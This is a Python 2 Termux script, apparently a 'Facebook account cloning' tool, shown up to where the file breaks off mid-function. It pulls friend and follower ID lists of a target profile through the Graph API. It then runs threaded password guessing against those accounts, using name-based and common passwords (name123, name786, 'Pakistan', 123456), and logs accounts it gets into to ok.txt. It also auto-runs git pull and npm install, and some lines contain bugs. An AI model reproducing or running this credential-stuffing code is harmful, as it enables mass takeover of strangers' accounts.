#coding=utf-8
#!/usr/bin/python2
#codded by CoD3R

try:
    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pip2 install requests")
    os.system("python2 CoD3R.py")
os.system("clear")
if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
    os.system("apt update && apt install nodejs -y")
from requests.exceptions import ConnectionError
os.system("git pull")
if not os.path.isfile("/data/data/com.termux/files/home/CoD3R/Coder/node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd Coder && npm install")
    os.system("cd Coder && node index.js &")
    os.system("clear")
    time.sleep(10)
elif os.path.isfile("/data/data/com.termux/files/home/CoD3R/Coder/node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("cd .termux && node index.js &")
#elif os.path.isfile("/data/data/com.termux/files/home/CoD3R/Coder/node_modules/bytes/generate_fb_token.js"):
    #os.system("fuser -k 5000/tcp &")
    #os.system("cd .termux && node generate_fb_token.js &")
#elif os.path.isfile("/data/data/com.termux/files/home/CoD3R/Coder/node_modules/bytes/loadJS.js"):
    #os.system("fuser -k 5000/tcp &")
    #os.system("cd .termux && node loadJS.js &")
    os.system("clear")
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188828013;FBCR/Advance Info Service;FBMF/samsung;FBDV/SM-N950N;FBSV/5.1.1;FBCA/x86;armeabi-v7a;FBDM{density=2.0,width=900,height=1600};FB_FW;FBRV/0;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")

p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\x1b[0;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""

banner="""
\033[1;95m   ____           ____    _____   ____  
\033[1;95m  / ___|   ___   |  _ \  |___ /  |  _ \  
\033[1;95m | |      / _ \  | | | |   |_ \  | |_) |
\033[1;95m | |___  | (_) | | |_| |  ___) | |  _ < 
\033[1;95m  \____|  \___/  |____/  |____/  |_| \_\ 
\033[1;95m
\033[1;92m༄ᶜᵒᵈ³ʳ᭄•───────────────────────────────────────────•༄ᶜᵒᵈ³ʳ᭄
\033[0;91m༄ᶜᵒᵈ³ʳ᭄ \033[0;97mCoded By \033[0;91mCoD3R
\033[0;91m༄ᶜᵒᵈ³ʳ᭄ \033[0;97mFB \033[0;91m: \033[0;97mFacebook.com/SpArKCoD3R
\033[0;91m༄ᶜᵒᵈ³ʳ᭄ \033[0;97mFB \033[0;91m: \033[0;97mFacebook.com/mobeen.ansari.124
\033[0;91m༄ᶜᵒᵈ³ʳ᭄ \033[0;97mGithub \033[0;91m: \033[0;97mGithub.com/CoD3R1337
\033[1;92m༄ᶜᵒᵈ³ʳ᭄•───────────────────────────────────────────•༄ᶜᵒᵈ³ʳ᭄
"""

def user_info():
    os.system("clear")
    print banner
    time.sleep(1)
    try:
        abm = open("/sdcard/Coder.txt", "r").read()
    except (KeyError , IOError):
        menu_login()
        os.system('clear')
	print banner
	print("\033[1;93mPlease Wait A Mintue").center(50)
	print("")
        os.system("cd Coder && npm install")
        os.system("fuser -k 5000/tcp &")
        os.system("cd Coder && node index.js &")
        time.sleep(3)
        menu_login()
    else:
        os.system("clear")
	print banner
	print("\033[1;93mThis Tool Is temporarily lock").center(50)
	print('')
	print("\033[1;93mPut Api Key To Unlock This Tool").center(50)
	print('')
	api = raw_input("\033[1;97m[!] Put Api Key :\033[0;90m ")
	if api =="CoD3R1337":
		print("")
		time.sleep(3)
		print("\033[1;92mTool Has Unlock Success").center(50)
		print("")
		time.sleep(2)
		menu_login()
	else:
		print("")
		time.sleep(1)
		print("\033[1;91mApi Key Is Invalid").center(50)
		print("")
		time.sleep(3)
		user_info()
		
def menu_login():
	os.system("clear")
	print banner
	print(h+"\n["+m+"1"+h+"]"+p+" Login with Token")
	print(h+"["+m+"2"+h+"]"+p+" Login with Facebook")
	print(h+"["+m+"0"+h+"]"+p+" Exit")
	print("\033[1;92m༄ᶜᵒᵈ³ʳ᭄•───────────────────────────────────────────•༄ᶜᵒᵈ³ʳ᭄")
	menu_login2() 
def menu_login2():
	user_select = raw_input(h+"\n["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"]"+p+" Choose : ")
	if user_select =="1":
		os.system("clear")
		print banner
		print("Login With Token").center(50)
		print("")
                token = raw_input(h+"\n["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"]"+p+"Paste Token Here : ")
                token_ab = open("token.txt", "w")
                token_ab.write(token)
                token_ab.close()
		print("")
		print(h+"\n["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"]"+p+" Login Successful").center(50)
		time.sleep(2)
		os.system("cd Coder && npm install")
                os.system("fuser -k 5000/tcp &")
                os.system("cd Coder && node index.js &")
                time.sleep(3)
                menu()
	if user_select =="2":
		login_fb()
	elif user_select =="0":
		os.system("exit")
	else:
		print("")
		print("Please Select A Valid Option")
		print("")
		time.sleep(3)
		menu_login()
		
def login_fb():
    os.system("clear")
    print banner
    lid = raw_input("[!] Id/mail/no: ")
    pwds = raw_input("[!] Password : ")
    data = requests.get("http://localhost:5000/auth?id=" + uid + "&pass=" + pwd).text
    q = json.loads(data)
    if "loc" in q:
        login_abm = open('token.txt', 'w')
        login_abm.write(q["loc"])
        login_abm.close()
	print("")
	print("\033[1;92mLogin Success").center(50)
	time.sleep(3)
        menu()
    elif 'www.facebook.com' in q['error']:
        print("")
        print("Email Or Password Has Wrong").center(50)
	time.sleep(3)
        login_fb()
    else:
        print("")
        print("Login Has CheckPoint").center(50)
        print("")
        time.seelp(3)
	login_fb()
		
def menu():
    os.system("clear")
    try:
        token = open("token.txt", "r").read()
    except(KeyError , IOError):
        menu_login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
        q = json.loads(r.text)
        name = q["name"]
    except(KeyError):
        print banner
        print("")
        print("logged account has checkpoint").center(50)
	time.sleep(3)
        os.system("rm -rf token.txt")
        print("")
        time.sleep(1)
        menu_login()
    os.system("clear")
    print banner
    print("\n"+m+"Welcome : " +name)
    print("")
    print(h+"["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"]"+p+" Developer  : "+h+"CoD3R"+p)
    print(h+"\n["+m+"1"+h+"]"+p+" Cloning with Default Pass friend/public")
    print(h+"["+m+"2"+h+"]"+p+" Cloning with Manual Pass")
    print(h+"["+m+"3"+h+"]"+p+" View Token")
    print(h+"["+m+"4"+h+"]"+p+" Checking Updates ")
    print(h+"["+m+"0"+h+"]"+p+" Logout")
    print("\n\033[1;92m༄ᶜᵒᵈ³ʳ᭄•───────────────────────────────────────────•༄ᶜᵒᵈ³ʳ᭄")
    menu_select()
def menu_select():
	select = raw_input(h+"\n["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"]"+p+" Choose :-")
	if select =="1":
		crack()
	elif select =="2":
		choose()
	elif select =="3":
		view_token()
	elif select =="4":
		os.system("cd Coder && npm install")
                os.system("fuser -k 5000/tcp &")
                os.system("cd Coder && node index.js &")
		os.system("git pull")
		time.sleep(2)
		menu()
	elif select =="0":
		os.system("clear")
	        print banner
	        print("")
	        raw_input("Press Enter To Tool Logout")
	        time.sleep(3)
	        os.system("exit")
	else:
		print("")
		print("\tSelect valid option")
		print("")
		menu_select()
def crack():
	global token
	os.system("clear")
	try:
		token = open("token.txt","r").read()
	except IOError:
		print("")
		print("\tToken not found ")
		time.sleep(1)
		menu_login()
	os.system("clear")
	print banner
	print(h+"["+m+"1"+h+"]"+p+" Cloning Friendlist/public ID.")
	print(h+"["+m+"2"+h+"]"+p+" Cloning Followers ID")
	print(h+"["+m+"0"+h+"]"+p+" Back")
	print("\n\033[1;92m༄ᶜᵒᵈ³ʳ᭄•───────────────────────────────────────────•༄ᶜᵒᵈ³ʳ᭄")
	crack_select()
def crack_select():
	select = raw_input(h+"\n["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mChoose :-")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print banner
		idt = raw_input(h+"\n["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mPaste ID Here :-")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system('clear')
			print banner
			print(h+"\n["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mTarget User : "+q["name"])
		except KeyError:
			print("")
			print("\033[1;91mInvalid id or Friendlist Private").center(50)
			print("")
			time.sleep(3)
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"•"+nm)
	elif select =="2":
		os.system("clear")
		print banner
		idt = raw_input(h+"\n["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mPaste ID Here :-")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system("clear")
			print banner
			print(h+"\n["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mTarget User : "+q["name"])
		except KeyError:
			print("\tInvalid id link")
			print("")
			raw_input(" Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"•"+nm)
	elif select =="0":
	    menu()
	else:
		print("")
		print("\033[1;91mPlease Select A Valid Option").center(50)
		print("")
		time.sleep(3)
		crack_select()
	print(h+"\n["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mTotal User Ids :\033[1;92m "+str(len(id)))
	time.sleep(0.05)
	print(h+"["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mCloning Start.... ")
	time.sleep(0.05)
	print(h+"["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mPlease Wait Cloned Accounts Will Be appeare Here..... ")
	time.sleep(0.05)
	print("\033[1;92m༄ᶜᵒᵈ³ʳ᭄•───────────────────────────────────────────•༄ᶜᵒᵈ³ʳ᭄")

			
	def main(arg):
		user=arg
		uid,name=user.split("•")
		try:
			pass1 = name+"123"
			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass1+"\033[0;97m")
				ok = open("ok.txt","a")
				ok.write(uid+"• "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error"]:
					print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass1)
					cp = open("cp.txt","a")
					cp.write(uid+" • "+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name+"1234"
					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass2+"\033[0;97m")
						ok = open("ok.txt","a")
						ok.write(uid+" • "+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error"]:
							print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass2)
							cp = open("cp.txt","a")
							cp.write(uid+" • "+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name+"12345"
							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
							q = json.loads(data)
							if "loc" in q:
								print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass3+"\033[0;97m")
								ok = open("ok.txt","a")
								ok.write(uid+" • "+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error"]:
									print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass3)
									cp = open("cp.txt","a")
									cp.write(uid+" • "+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name+"786"
									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass4+"\033[0;97m")
										ok = open("ok.txt","a")
										ok.write(uid+" • "+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error"]:
											print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass4)
											cp = open("cp.txt","a")
											cp.write(uid+" • "+pass4+"\n")
											cp.close()
											cps.apppend(uid+pass4)
										else:
											pass5 = "786786"
											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
											q = json.loads(data)
											if "loc" in q:
												print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass5+"\033[0;97m")
												ok = open("ok.txt","a")
												ok.write(uid+" • "+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error"]:
													print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass5)
													cp = open("cp.txt","a")
													cp.write(uid+" • "+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													pass6 = "223344"
													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
													q = json.loads(data)
													if "loc" in q:
														print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass6+"\033[0;97m")
														ok = open("ok.txt","a")
														ok.write(uid+" • "+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in q["error"]:
															print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass6)
															cp = open("cp.txt","a")
															cp.write(uid+" • "+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															pass7 = "Pakistan"
															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
															q = json.loads(data)
															if "loc" in q:
																print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass7+"\033[0;97m")
																ok = open("ok.txt","a")
																ok.write(uid+" • "+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in q["error"]:
																	print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass7)
																	cp = open("cp.txt","a")
																	cp.write(uid+" • "+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
																else:
																	pass8 = "102030"
																	data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass8, headers=header).text
																	q = json.loads(data)
																	if "loc" in q:
																		print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass8+"\033[0;97m")
																		ok = open("ok.txt","a")
																		ok.write(uid+" • "+pass8+"\n")
																		ok.close()
																		oks.append(uid+pass8)
																	else:
																		if "www.facebook.com" in q["error"]:
																			print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass8)
																			cp = open("cp.txt","a")
																			cp.write(uid+" • "+pass8+"\n")
																			cp.close()
																			cps.append(uid+pass8)
																		else:
																			pass9 = "556677"
																			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass9, headers=header).text
																			q = json.loads(data)
																			if "loc" in q:
																				print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass9+"\033[0;97m")
																				ok = open("ok.txt","a")
																				ok.write(uid+" • "+pass9+"\n")
																				ok.close()
																				oks.append(uid+pass9)
																			else:
																				if "www.facebook.com" in q["error"]:
																					print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass9)
																					cp = open("cp.txt","a")
																					cp.write(uid+" • "+pass9+"\n")
																					cp.close()
																					cps.append(uid+pass9)
																				else:
																					pass10 = "123456"
																					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass10, headers=header).text
																					q = json.loads(data)
																					if "loc" in q:
																						print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass10+"\033[0;97m")
																						ok = open("ok.txt","a")
																						ok.write(uid+" • "+pass10+"\n")
																						ok.close()
																						oks.append(uid+pass10)
																					else:
																						if "www.facebook.com" in q["error"]:
																							print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass10)
																							cp = open("cp.txt","a")
																							cp.write(uid+" • "+pass10+"\n")
																							cp.close()
																							cps.append(uid+pass10)
																						else:
																							pass11 = name+"123456"
																							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass11, headers=header).text
																							q = json.loads(data)
																							if "loc" in q:
																								print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass11+"\033[0;97m")
																								ok = open("ok.txt","a")
																								ok.write(uid+"• "+pass11+"\n")
																								ok.close()
																								oks.append(uid+pass11)
																							else:
																								if "www.facebook.com" in q["error"]:
																									print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass11)
																									cp = open("cp.txt","a")
																									cp.write(uid+" • "+pass11+"\n")
																									cp.close()
																									cps.append(uid+pass11)
																								else:
																									pass12 = name+"012"
																									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass12, headers=header).text
																									q = json.loads(data)
																									if "loc" in q:
																										print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass12+"\033[0;97m")
																										ok = open("ok.txt","a")
																										ok.write(uid+" • "+pass12+"\n")
																										ok.close()
																										oks.append(uid+pass12)
																									else:
																										if "www.facebook.com" in q["error"]:
																											print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass12)
																											cp = open("cp.txt","a")
																											cp.write(uid+" • "+pass12+"\n")
																											cp.close()
																											cps.append(uid+pass12)
																										else:
																											pass13 = name+"@123"
																											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass13, headers=header).text
																											q = json.loads(data)
																											if "loc" in q:
																												print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass13+"\033[0;97m")
																												ok = open("ok.txt","a")
																												ok.write(uid+" • "+pass13+"\n")
																												ok.close()
																												oks.append(uid+pass13)
																											else:
																												if "www.facebook.com" in q["error"]:
																													print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass13)
																													cp = open("cp.txt","a")
																													cp.write(uid+" • "+pass13+"\n")
																													cp.close()
																													cps.append(uid+pass13)
																												else:
																													pass14 = name+"@786"
																													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass14, headers=header).text
																													q = json.loads(data)
																													if "loc" in q:
																														print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass14+"\033[0;97m")
																														ok = open("ok.txt","a")
																														ok.write(uid+" • "+pass14+"\n")
																														ok.close()
																														oks.append(uid+pass14)
																													else:
																														if "www.facebook.com" in q["error"]:
																															print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass14)
																															cp = open("cp.txt","a")
																															cp.write(uid+" • "+pass14+"\n")
																															cp.close()
																															cps.apppend(uid+pass14)
																														else:
																															pass15 = "786786786"
																															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass15, headers=header).text
																															q = json.loads(data)
																															if "loc" in q:
																																print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass15+"\033[0;97m")
																																ok = open("ok.txt","a")
																																ok.write(uid+" • "+pass15+"\n")
																																ok.close()
																																oks.append(uid+pass15)
																															else:
																																if "www.facebook.com" in q["error"]:
																																	print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass15)
																																	cp = open("cp.txt","a")
																																	cp.write(uid+" • "+pass15+"\n")
																																	cp.close()
																																	cps.append(uid+pass15)
																																else:
																																	pass16 = "009988"
																																	data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass16).text
																																	q = json.loads(data)
																																	if "loc" in q:
																																		print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass16+"\033[0;97m")
																																		ok = open("ok.txt","a")
																																		ok.write(uid+" • "+pass16+"\n")
																																		ok.close()
																																		oks.append(uid+pass16)
																																	else:
																																		if "www.facebook.com" in q["error"]:
																																			print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass16)
																																			cp = open("cp.txt","a")
																																			cp.write(uid+" • "+pass16+"\n")
																																			cp.close()
																																			cps.append(uid+pass16)
																																		else:
																																			pass17 = "Pakistan"
																																			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass17, headers=header).text
																																			q = json.loads(data)
																																			if "loc" in q:
																																				print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass17+"\033[0;97m")
																																				ok = open("ok.txt","a")
																																				ok.write(uid+" • "+pass17+"\n")
																																				ok.close()
																																				oks.append(uid+pass17)
																																			else:
																																				if "www.facebook.com" in q["error"]:
																																					print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass17)
																																					cp = open("cp.txt","a")
																																					cp.write(uid+" • "+pass17+"\n")
																																					cp.close()
																																					cps.append(uid+pass17)
																																				else:
																																					pass18 = "pakistan123"
																																					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass18, headers=header).text
																																					q = json.loads(data)
																																					if "loc" in q:
																																						print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass18+"\033[0;97m")
																																						ok = open("ok.txt","a")
																																						ok.write(uid+" • "+pass18+"\n")
																																						ok.close()
																																						oks.append(uid+pass18)
																																					else:
																																						if "www.facebook.com" in q["error"]:
																																							print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass18)
																																							cp = open("cp.txt","a")
																																							cp.write(uid+" • "+pass18+"\n")
																																							cp.close()
																																							cps.append(uid+pass18)
																																						else:
																																							pass19 = "pakistan786"
																																							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass19, headers=header).text
																																							q = json.loads(data)
																																							if "loc" in q:
																																								print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass19+"\033[0;97m")
																																								ok = open("ok.txt","a")
																																								ok.write(uid+" • "+pass19+"\n")
																																								ok.close()
																																								oks.append(uid+pass19)
																																							else:
																																								if "www.facebook.com" in q["error"]:
																																									print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass19)
																																									cp = open("cp.txt","a")
																																									cp.write(uid+" • "+pass19+"\n")
																																									cp.close()
																																									cps.append(uid+pass19)
																																								else:
																																									pass20 = "india123"
																																									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass20, headers=header).text
																																									q = json.loads(data)
																																									if "loc" in q:
																																										print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass20+"\033[0;97m")
																																										ok = open("ok.txt","a")
																																										ok.write(uid+" • "+pass20+"\n")
																																										ok.close()
																																										oks.append(uid+pass20)
																																									else:
																																										if "www.facebook.com" in q["error"]:
																																											print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass20)
																																											cp = open("cp.txt","a")
																																											cp.write(uid+" • "+pass20+"\n")
																																											cp.close()
																																											cps.append(uid+pass20)
																
		except:
			pass
	
	p = ThreadPool(30)
	p.map(main,id)
	print("\033[1;92m༄ᶜᵒᵈ³ʳ᭄•───────────────────────────────────────────•༄ᶜᵒᵈ³ʳ᭄")
	print(h+"\n["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mProcess Has Been Complete..... ")
	print(h+"["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mTotal OK/CP "+str(len(oks)))+"/"+str(len(cps))
	raw_input(h+"["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mPress Enter to Back ")
	crack()
			
def choose():
	global token
	os.system("clear")
	try:
		token = open("token.txt","r").read()
	except IOError:
		print("")
		print("Token Not Found OR Has CheckPoint").center(50)
		time.sleep(2)
		menu_login()
	os.system("clear")
	print banner
	print(h+"["+m+"1"+h+"]"+p+" Cloning Friendlist/public ID.")
	print(h+"["+m+"2"+h+"]"+p+" Cloning Followers ID")
	print(h+"["+m+"0"+h+"]"+p+" Back")
	print("\033[1;92m༄ᶜᵒᵈ³ʳ᭄•───────────────────────────────────────────•༄ᶜᵒᵈ³ʳ᭄")
	choice_select()
def choice_select():
	select = raw_input(h+"\n["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mChoose :-")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print banner
		idt = raw_input(h+"\n["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mPaste ID Here.. :-")
		print("")
		pass1 = raw_input("\033[0;31m[1] \033[1;97mEnter Password :\033[0;31m ")
		pass2 = raw_input("\033[0;31m[2] \033[1;97mEnter Password :\033[0;31m ")
		pass3 = raw_input("\033[0;31m[3] \033[1;97mEnter Password :\033[0;31m ")
		pass4 = raw_input("\033[0;31m[4] \033[1;97mEnter Password :\033[0;31m ")
		pass5 = raw_input("\033[0;31m[5] \033[1;97mEnter Password :\033[0;31m ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system('clear')
			print banner
			print(h+"\n["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mTarget User : "+q["name"])
		except KeyError:
			print("")
			print("Public ID Not Found").center(50)
			print("")
			time.sleep(3)
			choose()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"•"+nm)
	elif select =="2":
		os.system("clear")
		print banner
		idt = raw_input(h+"\n["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mPaste ID Here..:-")
		print("")
		pass1 = raw_input("\033[0;31m[1] \033[1;97mEnter Password :\033[0;31m ")
		pass2 = raw_input("\033[0;31m[2] \033[1;97mEnter Password :\033[0;31m ")
		pass3 = raw_input("\033[0;31m[3] \033[1;97mEnter Password :\033[0;31m ")
		pass4 = raw_input("\033[0;31m[4] \033[1;97mEnter Password :\033[0;31m ")
		pass5 = raw_input("\033[0;31m[5] \033[1;97mEnter Password :\033[0;31m ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system('clear')
			print banner
			print(h+"\n["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mTarget User : "+q["name"])
		except KeyError:
			print("")
			print("Public ID Not Found").center(50)
			print("")
			time.sleep(3)
			choose()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"•"+nm)
	elif select =="0":
	    menu()
	else:
		print("")
		print("\t    \033[1;91mSelect valid option\033[0;97m")
		print("")
		time.sleep(3)
		choose()
	print(h+"\n["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mTotal User Ids :\033[1;92m "+str(len(id)))
	time.sleep(0.05)
	print(h+"["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mCloning Start.... ")
	time.sleep(0.05)
	print(h+"["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mPlease Wait Cloned Accounts Will Be appeare Here..... ")
	time.sleep(0.05)
	print("\033[1;92m༄ᶜᵒᵈ³ʳ᭄•───────────────────────────────────────────•༄ᶜᵒᵈ³ʳ᭄")
			
			
	def main(arg):
		user=arg
		uid,name=user.split("•")
		try:
			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass1+"\033[0;97m")
				ok = open("CoD3R-OK.txt", "a")
				ok.write(uid+" • "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error"]:
					print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass1+"\033[0;97m")
					cp = open("CoD3R-CP.txt","a")
					cp.write(uid+" • "+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass2+"\033[0;97m")
						ok = open("CoD3R-OK.txt", "a")
						ok.write(uid+" • "+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error"]:
							print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass2+"\033[0;97m")
							cp = open("CoD3R-CP.txt","a")
							cp.write(uid+" • "+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
